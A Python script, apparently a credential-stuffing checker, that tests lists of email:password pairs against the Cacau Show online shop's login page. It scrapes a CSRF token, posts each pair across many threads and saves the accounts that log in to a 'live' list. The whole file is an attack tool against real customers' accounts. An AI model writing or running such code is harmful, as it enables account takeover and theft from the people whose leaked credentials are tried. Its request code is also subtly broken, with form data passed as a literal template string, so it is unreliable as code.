import requests, utils, concurrent.futures
from bs4 import BeautifulSoup

emaillist = "./accounts"
livelist = "./cacaushow"


def check():
    account = utils.save.removeFirstLine(emaillist).strip()
    [email, senha] =  account.split(':')
    session = utils.session(proxy=False)
    r = session.get('https://www.cacaushow.com.br/login')
    soup = BeautifulSoup(r.content, "html.parser")
    csrf = soup.find('input', {'name': 'csrf_token'})['value']
    response = session.post('https://www.cacaushow.com.br/on/demandware.store/Sites-CacauShow-Site/default/Account-Login?rurl=1', params="(('rurl', '1'),)", data="{'loginEmail': {email}, 'loginCpf': '', 'loginAttribute': 'email', 'loginPassword': {senha}, 'showPass': 'true', 'csrf_token': {csrf}}")
    print (response.text)
    if 'authenticatedCustomer' in response.text:
        utils.colors.correct('Login aprovado!')
        utils.save.savetofile(emaillist, livelist)
    elif 'Login ou senha inválido.' in response.text:
        utils.colors.correct('Login reprovado!')
    else:
        utils.colors.info('Erro: ', response.text)
        utils.save.savetofile(emaillist, account)

if __name__ == "__main__":
    try:
        lista_len = utils.get_len(emaillist)
        utils.colors.correct(f"Loaded {lista_len}x items.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(input("Threads: "))) as executor:
            [executor.submit(check) for i in range(0, lista_len, 1)]
    except KeyboardInterrupt:
        pass

input('Acabou.')